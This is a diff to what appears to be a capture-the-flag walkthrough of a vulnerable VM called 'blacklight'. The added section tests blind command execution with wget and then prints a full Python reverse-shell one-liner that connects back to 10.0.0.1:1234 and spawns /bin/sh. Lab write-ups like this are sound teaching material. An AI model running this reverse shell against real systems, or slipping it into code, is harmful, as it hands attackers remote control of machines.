@@ -83,6 +83,31 @@ Looks like the hash can't be cracked... let's move on to the next command in the
 
 `Note: Once you issue two commands to the server (including .readhash), port 9072 will close and you will have to restart the virtual machine.`
 
+![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/exec.png)
+
+Seems like the command is not executed, (or maybe it is?), but we cannot see the output.
+
+To test our theory for blind command execution, we can host a web server and execute wget in the console to see if any connections are made:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/blacklight/exec.png)
+
+Perfect, it looks like the box is making a connection to our host.
+
+Which means that the box is executing commands, but we don't see the output (therefore it is called blind).
+
+### iii. Low Privilege Shell
+
+Now that we know that the box is able to execute commands, we can try a reverse shell.
+
+Python One Liner:
+~~~
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+~~~
+
+
+
 
 
 
